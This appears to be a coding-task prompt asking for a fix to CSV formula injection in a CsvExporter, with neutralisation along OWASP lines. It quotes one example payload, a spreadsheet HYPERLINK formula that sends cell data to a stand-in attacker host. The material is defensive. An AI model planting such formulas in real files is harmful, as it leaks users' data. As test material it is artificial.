prompt:
Security review of the new CSV export (`io.CsvExporter`), severity medium.

Transaction descriptions come from user input: imported bank memos, splitter memos,
free text typed by staff. A description such as

    =HYPERLINK("http://evil.invalid/?d="&A1,"Refund status")

is written to the export as-is, so when finance opens the file in a spreadsheet it
becomes a live formula (CSV / formula injection). The same goes for text starting with
`+`, `-` or `@`.

Expected: any text cell that a spreadsheet would treat as a formula (first character
`=`, `+`, `-`, `@`, tab or carriage return) is exported in the neutralised form OWASP
describes, so a description `=1+2` shows up in the file as the text `'=1+2`. Everything
else stays as it is: ordinary descriptions are unchanged, numeric columns (the amount)
remain plain numbers, and the output is still valid CSV that `CsvImporter` can read back.
